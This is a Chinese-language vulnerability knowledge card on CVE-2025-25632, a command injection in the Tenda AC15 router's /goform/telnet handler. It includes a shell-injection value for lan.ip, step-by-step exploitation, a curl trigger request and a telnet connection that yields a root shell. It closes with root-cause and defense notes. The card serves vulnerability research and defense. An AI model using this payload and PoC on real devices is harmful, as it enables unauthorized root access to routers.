---
id: iot-tenda-ac15-goform-telnet-command-injection
title: Tenda AC15 /goform/telnet 命令注入（CVE-2025-25632）：doSystemCmd 拼接 lan.ip 启动 telnetd
type: scenario
domain: iot
path: iot
technique: tenda-ac15-goform-telnet-command-injection
tags:
- iot
- router
- tenda
- command-injection
- firmware
- rce
cve:
- CVE-2025-25632
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: Tenda AC15 v1.0 V15.03.05.19
verification:
  verified_by: verifier-V206
  verified_at: '2026-11-07T02:23:28+08:00'
  notes: 已对照原文与图46-47核对：TendaTelnet 中 GetValue("lan.ip",v3)→system("killall -9 telnetd")→doSystemCmd("telnetd -b %s &",v3)，图注 CVE-2025-25632；PoC curl POST /goform/telnet（Cookie user=admin）返回 load telnetd success，telnet 192.168.0.1 80 连接成功。原文仅展示触发、未展示 lan.ip 注入设置请求，卡内已注明；未复跑 PoC。affected_versions 按原文保留 Tenda AC15 v1.0 V15.03.05.19。
url: /docs/iot/iot-tenda-ac15-goform-telnet-command-injection/
draft: false
kb_aliases:
- CVE-2025-25632
- TendaTelnet
- doSystemCmd
- goform/telnet
- telnetd -b
---

## 一句话结论

Tenda AC15 的 `/goform/telnet` 处理函数 `TendaTelnet` 先从 NVRAM 读取 `lan.ip` 到 `v3`，执行 `system("killall -9 telnetd")` 后调用 `doSystemCmd("telnetd -b %s &", v3)`；`lan.ip` 未过滤 shell 元字符时被拼进命令，攻击者可通过配置 `lan.ip` 注入命令，再用 `POST /goform/telnet` 触发，开启 telnetd/反弹 shell。

## 原理

- 逆向 `httpd` 的 `TendaTelnet`：
  - `char v3[32]; char s[268];`
  - `GetValue("lan.ip", v3);` 从 NVRAM 取 LAN IP；
  - `system("killall -9 telnetd");`
  - `doSystemCmd("telnetd -b %s &", v3);` —— 直接把 `v3` 拼进 shell 命令；
  - 之后 `sprintf(s, "op=%d,wl_rate=%d,index=1", 14, 24); send_msg_to_netctrl(19, s);` 并返回 `load telnetd success.`。
- `doSystemCmd` 内部通常走 `system()`/`popen()`，因此 `lan.ip` 中的 `;`、`|`、`&`、`$()`、反引号等会被 shell 解释；例如把 `lan.ip` 设为 `192.168.0.1; telnetd -l /bin/sh -p 80`，拼接后变成
  `telnetd -b 192.168.0.1; telnetd -l /bin/sh -p 80 &`，注入的命令被执行。
- `lan.ip` 是设备配置项，可通过 Web 管理界面的 LAN 设置或对应 `AdvSetLanip`/NVRAM 接口修改；`/goform/telnet` 只负责“杀死旧 telnetd 并用当前 lan.ip 重新启动”，因此攻击链是“先改配置，再触发”。
- 由于 `httpd` 在嵌入式设备上常以 root 运行，命令注入即 root RCE；本题通过该入口启动 telnetd，随后 `telnet 192.168.0.1 80` 取得 shell（文章 PoC 使用 `--cookie "user=admin"` 触发）。
- 根因是把配置值当命令参数拼接，没有用 `execve` 参数数组、也没有对 IP 做 `inet_pton` 格式校验。

## 触发条件

- 目标为 Tenda AC15 v1.0 V15.03.05.19（或同代码分支的 AC15 固件），`/goform/telnet` 路由可达。
- 攻击者能修改 `lan.ip` 配置（管理员界面、默认口令、CSRF 或其它配置接口）。
- `httpd` 以 root/高权限运行，`doSystemCmd` 使用 shell 解析。
- 触发请求可能需要 `Cookie: user=admin` 或已登录会话（文章 PoC 带了该 Cookie）。

## 利用步骤

1. 访问设备 Web，确认固件版本/路由；抓取 LAN 设置请求，定位 `lan.ip`/`AdvSetLanip` 等配置接口。
2. 把 `lan.ip` 设置为注入载荷，例如 `192.168.0.1; telnetd -l /bin/sh -p 80`（或 `; /bin/sh -c '...'`）。
3. 发送 `POST /goform/telnet` 触发 `TendaTelnet`，响应出现 `load telnetd success.`。
4. 连接注入开启的服务（文章为 `telnet 192.168.0.1 80`），执行命令确认权限。
5. 若端口/命令被限制，改用反弹 shell、写文件到 Web 目录或其它可用命令。

## PoC

```bash
# 1) 通过 LAN 设置接口把 lan.ip 改为注入值（端点/参数按固件实际，示意）
#    目标值示例：192.168.0.1; telnetd -l /bin/sh -p 80

# 2) 触发 TendaTelnet
curl -i -X POST http://192.168.0.1/goform/telnet \
  -d aa=aa --cookie "user=admin" --http0.9

# 3) 连接注入开启的 shell
telnet 192.168.0.1 80
```

说明：文章 PoC 只展示了触发请求与 `telnet ... 80` 成功连接，未展示 `lan.ip` 的具体设置请求；代码截图确认 sink 为 `doSystemCmd("telnetd -b %s &", v3)`，注入值需通过配置链路控制。

## 变体与关联

- **其它 Tenda 路由**：同族 `httpd` 的 `doSystemCmd`/`system` 拼接点很多，可交叉引用查找 `GetValue` + 命令函数的组合。
- **IoT 命令注入通用模式**：配置值（lan.ip、hostname、NTP server、DDNS）进入 shell；见 [[iot-firmware-boa-pin-command-injection]]、[[iot-ipc-json-rpc-mp-rate-command-injection]]。
- **认证绕过配合**：若 `/goform/telnet` 的 `Cookie: user=admin` 可伪造/默认，注入无需真实登录。
- **CVE 关联**：同文章还提到 CVE-2025-25634（GetParentControlInfo 的 `mac` 参数 `strcpy` 溢出），该 PoC 仅造成崩溃，未作为本卡内容。

## 检测与防御

- 禁止把配置值拼进 `system`/`popen`；用 `execve`/`posix_spawn` 参数数组，IP 先 `inet_pton` 校验。
- 对 `/goform/*` 管理接口做真实认证与 CSRF 防护，不用可伪造的 `user=admin` Cookie。
- 固件层：最小权限运行 httpd、开启 ASLR/NX、对危险函数做封装审计。
- 检测：`lan.ip` 等配置项出现 `;|&$()`/反引号、`/goform/telnet` 后设备出现新监听端口/telnetd 进程、异常 shell 子进程。
